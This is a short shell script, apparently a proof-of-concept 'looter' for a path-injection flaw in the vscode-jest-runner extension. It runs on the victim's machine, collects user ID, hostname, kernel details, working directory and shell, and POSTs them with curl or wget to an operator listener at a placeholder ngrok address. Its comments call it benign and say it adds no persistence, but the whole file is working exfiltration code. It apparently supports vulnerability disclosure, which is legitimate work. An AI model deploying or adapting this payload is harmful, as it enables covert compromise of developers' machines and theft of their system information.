#!/bin/sh
# vscode-jest-runner H-1 PoC looter.
# Runs on the victim after the path-injection breaks out of the single quote.
# Collects benign system identification and POSTs it to the operator's listener.
# Does NOT install persistence, open a shell, or read user files.

LISTENER="${LISTENER_URL:-https://REPLACE-ME.ngrok-free.app/beacon}"

LOOT=$(
  echo "=== vscode-jest-runner H-1 PoC beacon ==="
  echo "ts: $(date -u +%FT%TZ)"
  echo "id: $(id 2>&1)"
  echo "whoami: $(whoami 2>&1)"
  echo "hostname: $(hostname 2>&1)"
  echo "uname: $(uname -a 2>&1)"
  echo "pwd: $(pwd 2>&1)"
  echo "shell: $SHELL"
  echo "vscode_pid_parent: $PPID"
)

# Single POST. No retry loop, no persistence.
curl -fsS -m 5 -X POST \
  -H 'Content-Type: text/plain' \
  --data-binary "$LOOT" \
  "$LISTENER" >/dev/null 2>&1 \
  || wget -q -T 5 --post-data="$LOOT" -O /dev/null "$LISTENER" 2>/dev/null

exit 0
